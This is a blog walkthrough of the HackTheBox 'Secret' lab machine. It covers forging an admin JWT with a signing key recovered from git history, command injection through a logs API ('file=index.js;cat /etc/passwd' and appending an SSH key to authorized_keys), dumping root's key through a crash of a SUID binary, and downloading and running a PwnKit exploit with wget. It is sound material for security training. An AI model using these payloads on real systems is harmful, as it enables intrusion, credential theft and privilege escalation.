---
layout: post
title: HackTheBox - Secret
tags: HTB CTF JWT
---

_Can you keep a secret?_

----------

## 1. Enumeration
- RustScan w/ Nmap

	```
	PORT     STATE SERVICE REASON  VERSION
	22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

	| ssh-hostkey: 
	|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
	| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBjDFc+UtqNVYIrxJx+2Z9ZGi7LtoV6vkWkbALvRXmFzqStfJ3UM7TuOcZcPd82vk0gFVN2/wjA3LUlbUlr7oSlD15DdJkr/XjYrZLJnG4NCxcAnbB5CIRaWmrrdGy5pJ/KgKr4UEVGDK+oAgE7wbv++el2WeD1DF8gw+GIHhtjrK1s0nfyNGcmGOwx8crtHB4xLpopAxWDr2jzMFMdGcIzZMRVLbe+TsG/8O/GFgNXU1WqFYGe4xl+MCmomjh9mUspf1WP2SRZ7V0kndJJxtRBTw6V+NQ/7EJYJPMeugOtbputyZMH+jALhzxBs07JLbw8Bh9JX+ZJl/j6VcIDfFRXxB7ceSe/cp4UYWcLqN+AsoE7k+uMCV6vmXYPNC3g5xfMMrDfVmGmrPbop0oPZUB3kr8iz5CI/qM61WI07/MME1uyM352WZHAJmeBLPAOy05ZBY+DgpVElkr0vVa+3UyKsF1dC3Qm2jisx/qh3sGauv1R8oXGHvy0+oeMOlJN+k=
	|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
	| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOL9rRkuTBwrdKEa+8VrwUjloHdmUdDR87hBOczK1zpwrsV/lXE1L/bYvDMUDVD0jE/aqMhekqNfBimt8aX53O0=
	|   256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
	|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINM1K8Yufj5FJnBjvDzcr+32BQ9R/2lS/Mu33ExJwsci

	80/tcp   open  http    syn-ack nginx 1.18.0 (Ubuntu)
	|_http-title: DUMB Docs
	| http-methods: 
	|_  Supported Methods: GET HEAD POST OPTIONS
	|_http-server-header: nginx/1.18.0 (Ubuntu)

	3000/tcp open  http    syn-ack Node.js (Express middleware)
	|_http-title: DUMB Docs
	| http-methods: 
	|_  Supported Methods: GET HEAD POST OPTIONS

	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
	```

- Gobuster
	```
	┌──(acousticgirl㉿kali)-[~/CTF/HTB/secret]
	└─$ gobuster dir -u 10.10.11.120 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,js | tee gobuster_php.log
	===============================================================
	Gobuster v3.1.0
	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
	===============================================================
	[+] Url:                     http://10.10.11.120
	[+] Method:                  GET
	[+] Threads:                 10
	[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
	[+] Negative Status codes:   404
	[+] User Agent:              gobuster/3.1.0
	[+] Extensions:              php,html,txt,js
	[+] Timeout:                 10s
	===============================================================
	2022/03/14 20:54:37 Starting gobuster in directory enumeration mode
	===============================================================
	/download             (Status: 301) [Size: 183] [--> /download/]
	/docs                 (Status: 200) [Size: 20720]               
	/assets               (Status: 301) [Size: 179] [--> /assets/]  
	/api                  (Status: 200) [Size: 93]                  
	/Docs                 (Status: 200) [Size: 20720]               
	/API                  (Status: 200) [Size: 93]                  
	/DOCS                 (Status: 200) [Size: 20720]               
	```

## 2. Website
- "DUMBDocs"
- An API based authentication system using JWT tokens.
- Node.js based
- Can register new users through API system
- Downloaded Source Code

## 3. Source Code
- Unzipped files.zip
- Looked at several .js files - `local-web/index.js`, `local-web/routes/private.js`, `local-web/routes/verifytoken.js`, etc.
- Got `theadmin` username from `local-web/routes/private.js` 
- `verifytoken.js` shows that no encryption algorithm is specified (possible to change?)
- Two hidden items in `local-web` - `.git` and `.env`
	- `.env` has the Token `secret` in it!
		```
		┌──(acousticgirl㉿kali)-[~/CTF/HTB/secret/local-web]
		└─$ ls -la
		total 116
		drwxrwxr-x   8 acousticgirl acousticgirl  4096 Sep  3  2021 .
		drwxr-xr-x   3 acousticgirl acousticgirl  4096 Mar 14 22:22 ..
		-rw-rw-r--   1 acousticgirl acousticgirl    72 Sep  3  2021 .env
		drwxrwxr-x   8 acousticgirl acousticgirl  4096 Sep  8  2021 .git
		-rw-rw-r--   1 acousticgirl acousticgirl   885 Sep  3  2021 index.js
		drwxrwxr-x   2 acousticgirl acousticgirl  4096 Aug 13  2021 model
		drwxrwxr-x 201 acousticgirl acousticgirl  4096 Aug 13  2021 node_modules
		-rw-rw-r--   1 acousticgirl acousticgirl   491 Aug 13  2021 package.json
		-rw-rw-r--   1 acousticgirl acousticgirl 69452 Aug 13  2021 package-lock.json
		drwxrwxr-x   4 acousticgirl acousticgirl  4096 Sep  3  2021 public
		drwxrwxr-x   2 acousticgirl acousticgirl  4096 Sep  3  2021 routes
		drwxrwxr-x   4 acousticgirl acousticgirl  4096 Aug 13  2021 src
		-rw-rw-r--   1 acousticgirl acousticgirl   651 Aug 13  2021 validations.js
                                                                                                                                                                             
		┌──(acousticgirl㉿kali)-[~/CTF/HTB/secret/local-web]
		└─$ cat .env               
		DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
		*TOKEN_SECRET = secret*
		```

## 4. Action Plan
- Two possible routes
	- _Plan 1_ - Try to do a user replacement by creating a second `theadmin` user
		- Try to find place to upload a reverse shell
	- _Plan 2_ - Create low level user and escalate privileges
		- Once created, alter JWT to try to login as `theadmin`
		- Try to find place to upload a reverse shell

## 5. Plan 1 (from outer spaaaaaace!)
- Attempted user replacement
	- Attempt
	```
	curl -i -X POST \
	  -H 'Content-Type: application/json' \
	  -d '{"name":" theadmin", "email":"drt@dasith.works", "password":"testpassword"}' \
	  http://10.10.11.120/api/user/register
	```
	- Success! (but not really)

		```
		HTTP/1.1 200 OK
		Server: nginx/1.18.0 (Ubuntu)
		Date: Tue, 15 Mar 2022 01:59:53 GMT
		Content-Type: application/json; charset=utf-8
		Content-Length: 20
		Connection: keep-alive
		X-Powered-By: Express
		ETag: W/"14-LWrfBFPQd+iUl+P35I+Rt9MzQss"

		{"user":" theadmin"}
		```

	- The user was created but it is ` theadmin` and not `theadmin` (notice the leading space). However, they both use the same email address.
	```
	curl -i -X POST \
    -H 'Content-Type: application/json' \
    -d '{"email":"drt@dasith.works", "password":"testpassword"}' \
    http://10.10.11.120/api/user/login
	```
	- Successfully logged in with ` theadmin` email and got our JWT:

		```
		HTTP/1.1 200 OK
		Server: nginx/1.18.0 (Ubuntu)
		Date: Tue, 15 Mar 2022 02:04:48 GMT
		Content-Type: text/html; charset=utf-8
		Content-Length: 211
		Connection: keep-alive
		X-Powered-By: Express
		auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJmZjMxOTlhNjA2ODA0NjM4OGRkMGQiLCJuYW1lIjoiIHRoZWFkbWluIiwiZW1haWwiOiJkcnRAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQ3MzA5ODg4fQ.hBPK1WyMZS5Xo1-DYmgN8iJimPStxfc6F1z5_mQp_Ls
		ETag: W/"d3-AbKQ3P+XBBjA9PHtvEjPlyeZqFA"

		eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJmZjMxOTlhNjA2ODA0NjM4OGRkMGQiLCJuYW1lIjoiIHRoZWFkbWluIiwiZW1haWwiOiJkcnRAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQ3MzA5ODg4fQ.hBPK1WyMZS5Xo1-DYmgN8iJimPStxfc6F1z5_mQp_Ls  
		```

## 6. Plan 2
- Low level user creation (achieved in Step 5)
- Let's alter our username in the JWT at https://jwt.io and sign it with our secret key
	```
	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJmZjMxOTlhNjA2ODA0NjM4OGRkMGQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRydEBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDczMDk4ODh9.ZoGUsmIsEESpXWqzWVczp-6ye-tLZzGQ_vciLwbsZjw
	```
- Lets test our token
	```
	curl -X POST http://10.10.11.120:3000/api/user/login
   -H "Authorization: Bearer {eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJmZjMxOTlhNjA2ODA0NjM4OGRkMGQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRydEBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDczMDk4ODh9.ZoGUsmIsEESpXWqzWVczp-6ye-tLZzGQ_vciLwbsZjw}"
   -d ‘{“email”:”drt@dasiths.works”,”password”:”testpassword”}’

   ┌──(acousticgirl㉿kali)-[~/CTF/HTB/secret/local-web]
   └─$ curl -i http://10.10.11.120:3000/api/priv 
   HTTP/1.1 401 Unauthorized
   X-Powered-By: Express
   Content-Type: text/html; charset=utf-8
   Content-Length: 13
   ETag: W/"d-Fke522wB/f0WEQT+w6CDKWhElh4"
   Date: Tue, 15 Mar 2022 03:41:39 GMT
   Connection: keep-alive

   Access Denied         
   ```	

- Access is still denied so `secret` must not be the correct key for `theadmin`

## 7. Back to the Source Code
- Digging into the source code, there's a hidden `.git` folder
- Let's look at the git logs to see if anything changed

	```
	┌──(acousticgirl㉿kali)-[~/…/HTB/secret/local-web/.git]
	└─$ git log                                         
	commit e297a2797a5f62b6011654cf6fb6ccb6712d2d5b (HEAD -> master)
	Author: dasithsv <dasithsv@gmail.com>
	Date:   Thu Sep 9 00:03:27 2021 +0530

	    now we can view logs from server 😃

	commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
	Author: dasithsv <dasithsv@gmail.com>
	Date:   Fri Sep 3 11:30:17 2021 +0530

	    removed .env for security reasons

	commit de0a46b5107a2f4d26e348303e76d85ae4870934
	Author: dasithsv <dasithsv@gmail.com>
	Date:   Fri Sep 3 11:29:19 2021 +0530

	    added /downloads

	commit 4e5547295cfe456d8ca7005cb823e1101fd1f9cb
	Author: dasithsv <dasithsv@gmail.com>
	Date:   Fri Sep 3 11:27:35 2021 +0530

	    removed swap
	```
	
	- This line looks promising - `removed .env for security reasons` so lets look at that commit

		```
		┌──(acousticgirl㉿kali)-[~/CTF/HTB/secret/local-web]
		└─$ git log -p  -- .env    
		commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
		Author: dasithsv <dasithsv@gmail.com>
		Date:   Fri Sep 3 11:30:17 2021 +0530

			removed .env for security reasons

		diff --git a/.env b/.env
		index fb6f587..31db370 100644
		--- a/.env
		+++ b/.env
		@@ -1,2 +1,2 @@
		DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
		-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
		+TOKEN_SECRET = secret

		commit 55fe756a29268f9b4e786ae468952ca4a8df1bd8
		Author: dasithsv <dasithsv@gmail.com>
		Date:   Fri Sep 3 11:25:52 2021 +0530

			first commit

		diff --git a/.env b/.env
		new file mode 100644
		```

- It looks like the key was set to 
	```
	gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
	```

	- Lets go back to https://jwt.io and use that as the secret key (instead of _secret_)
	- New token
		```
		eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJmZjMxOTlhNjA2ODA0NjM4OGRkMGQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRydEBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDczMDk4ODh9.U2kHzOJQZLIX8YzMvyx-Bsl4-7FLFDSfedr7vGXYh6U
		```
- Testing the new token
	```
	curl http://10.10.11.120:3000/api/priv   -H "auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjMwY2I0MDQyNGNmMDA0NWRmYmIyODAiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFjb3VzdGljZ2lybEBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDczNjQ5NDB9.bf79mgAuXL4tf05-Avv_Ami2WH-QlZFvr6WRtTng1kU"
	```
 - **SUCCESS!**
	```
	┌──(acousticgirl㉿kali)-[~/CTF/HTB/secret/local-web]
	└─$ curl http://10.10.11.120:3000/api/priv   -H "auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjMwY2I0MDQyNGNmMDA0NWRmYmIyODAiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFjb3VzdGljZ2lybEBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDczNjQ5NDB9.bf79mgAuXL4tf05-Avv_Ami2WH-QlZFvr6WRtTng1kU"
	{"creds":{"role":"admin","username":"theadmin","desc":"welcome back admin"}}     
	```

## 8. Abusing /api/logs

- You can query http://10.10.11.120/api/logs as admin and execute commands through index.js which includes an `exec()` call.
- Requests must be URL encoded (I used https://gchq.github.io/CyberChef/ for this)
- You can run the following request to read /etc/passwd
	```
	http://10.10.11.120/api/logs?file=index.js;cat%20/etc/passwd
	```
- Reading /etc/passwd gives you the name of the non-standard user `dasith`


## 9. Gaining SSH
- Generate a new ssh key for this challenge and label it secret.htb
	```
	ssh-keygen -t rsa -b 4096 -C 'acousticgirl@htb' -f secret.htb -P ''
	```
		- -C is the comment
		- -t is the type
		- -b is the bytes
		- -f is the file name
		- -P is the password
- Set your secret.htb file to be your `$PUBLIC_KEY`
	`export PUBLIC_KEY=$(cat secret.htb.pub)`
		- You **must** do this step
- Craft a GET request that adds your `$PUBLIC_KEY` contents to /home/dasith/.ssh/authorized_keys on the target machine
	```
	┌──(acousticgirl㉿kali)-[~/CTF/HTB/secret]
	└─$ curl \
	> -i \
	> -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjMwY2I0MDQyNGNmMDA0NWRmYmIyODAiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFjb3VzdGljZ2lybEBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDczNjQ5NDB9.bf79mgAuXL4tf05-Avv_Ami2WH-QlZFvr6WRtTng1kU' \
	> -G \
	> --data-urlencode "file=index.js; mkdir -p /home/dasith/.ssh; echo $PUBLIC_KEY >> /home/dasith/.ssh/authorized_keys" \
	> 'http://10.10.11.120/api/logs'
	HTTP/1.1 200 OK
	Server: nginx/1.18.0 (Ubuntu)
	Date: Tue, 15 Mar 2022 18:28:33 GMT
	Content-Type: application/json; charset=utf-8
	Content-Length: 27
	Connection: keep-alive
	X-Powered-By: Express
	ETag: W/"1b-pFfOEX46IRaNi6v8ztcwIwl9EF8"

	"ab3e953 Added the codes\n" 
```
- Login with SSH
	```
	ssh -i secret.htb dasith@10.10.11.120
	```


## 10. User Flag
	```
	cat user.txt
	d##############################d
	```

## 11. Gaining Root (Path 1 - CoreDump)
- There are two paths to gaining root on this box. This is the way the creators of the box intended you to root the box.
- Enumerate common directories either manually or with linpeas (I chose linpeas)
	- Get `linpeas.sh` onto the box, chmod it, and run
	- You will find a file that has a SUID bit set as root (`/opt/count`)
- Try the `/opt/count` program
	- It's like `wc` and can save to a file
- Investigate /opt/
	```
	dasith@secret:/tmp$ ls -la /opt
	total 56
	drwxr-xr-x  2 root root  4096 Oct  7 10:06 .
	drwxr-xr-x 20 root root  4096 Oct  7 15:01 ..
	-rw-r--r--  1 root root  3736 Oct  7 10:01 code.c
	-rw-r--r--  1 root root 16384 Oct  7 10:01 .code.c.swp
	-rwsr-xr-x  1 root root 17824 Oct  7 10:03 count
	-rw-r--r--  1 root root  4622 Oct  7 10:04 valgrind.log
	```
	- `valgrind.log` contains memory dump information
		- This indicates that CoreDump is enabled
	- `code.c` is the source code for count (I think...my C is _really_ rusty)
- Use `/opt/count` to count the lines for /root/.ssh/id_rsa
	- When it asks you to save it to a file, hit `Ctrl + z` to put it in the background
	- List running processes with `ps`
	- Kill the count process
		`kill -SIGSEGV <PID>`
	- Bring your session to the foreground with `fg`
	- Program will crash and memory will be dumped.
- Travel to `/var/crash` and look for the file with the owner set to `dasith`
	- Use apport-unpack to decompress the file to a directory in `/tmp` 
- Travel to your unpacked crash directory and view CoreDump
	`less CoreDump`
	- It will warn you it's a binary. Select Y to view it anyway.
- Scroll until you see BEGIN RSA KEY in plain text
- Copy this key to your attacking machine and save it
- Use this file to SSH as root
	`ssh -i id_rsa root@10.10.11.120`

## 12. Root Flag
- Navigate to `/root`
	```
	cat root.txt
	a##############################8
	```
- VICTORY!

## 13. Gaining Root (Path 2 - PwnKit)
- This is the easy way...
- It exploits a vulnerability in policykit (CVE-2021-4034)
- As `dasith` user, navigate to `/tmp`
- In the directory that your PwnKit script is in, start an HTTP server with Python
	`python3 -m http.server 80`
- On victim machine, pull the script down, chmod it to be executable, and run it
	```
	wget <your ip>/PwnKit
	chmod +x PwnKit
	./PwnKit
	```
- TADA! You are root! 
- Proceed to cat /root/root.txt for the root flag.
